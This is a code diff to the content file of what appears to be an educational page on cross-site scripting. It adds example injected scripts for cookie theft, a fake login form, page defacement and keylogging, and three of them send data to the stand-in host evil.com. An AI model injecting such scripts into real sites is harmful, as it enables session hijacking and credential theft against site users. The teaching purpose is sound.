@@ -34,10 +34,67 @@ export const LEARN_CONTENT = {
         type: "cards",
         heading: "Why is it dangerous?",
         items: [
-          { icon: "🍪", title: "Cookie Theft",    body: "Steal session cookies to log in as the victim." },
-          { icon: "🎣", title: "Phishing",        body: "Inject fake login forms to capture credentials." },
-          { icon: "🖥️", title: "Page Defacement", body: "Modify what the victim sees on the page." },
-          { icon: "⌨️", title: "Keylogging",      body: "Record every keystroke the victim types." },
+          {
+            icon: "🍪", title: "Cookie Theft", side: "left",
+            body: "Steal session cookies to log in as the victim.",
+            code: `// Injected into a vulnerable page
+<script>
+  // Grab the victim's session cookie
+  const stolen = document.cookie;
+
+  // Send it to the attacker's server
+  fetch("https://evil.com/steal?c=" + stolen);
+</script>`,
+          },
+          {
+            icon: "🎣", title: "Phishing", side: "right",
+            body: "Inject fake login forms to capture credentials.",
+            code: `// Injected into a vulnerable page
+<script>
+  // Replace the page with a fake login form
+  document.body.innerHTML = \`
+    <form action="https://evil.com/capture">
+      <p>Session expired. Please log in again.</p>
+      <input name="user" placeholder="Username" />
+      <input name="pass" placeholder="Password" type="password"/>
+      <button>Login</button>
+    </form>
+  \`;
+</script>`,
+          },
+          {
+            icon: "🖥️", title: "Page Defacement", side: "left",
+            body: "Modify what the victim sees on the page.",
+            code: `// Injected into a vulnerable page
+<script>
+  // Wipe the entire page content
+  document.body.innerHTML = \`
+    <div style="background:#000;color:red;
+                font-size:48px;text-align:center">
+      <br/><br/>
+      💀 You've been hacked 💀
+    </div>
+  \`;
+</script>`,
+          },
+          {
+            icon: "⌨️", title: "Keylogging", side: "right",
+            body: "Record every keystroke the victim types.",
+            code: `// Injected into a vulnerable page
+<script>
+  let log = "";
+
+  // Listen to every key the victim presses
+  document.addEventListener("keydown", (e) => {
+    log += e.key;
+
+    // Send to attacker every 5 seconds
+    if (log.length % 20 === 0) {
+      fetch("https://evil.com/keys?k=" + log);
+    }
+  });
+</script>`,
+          },
         ],
       },
       {
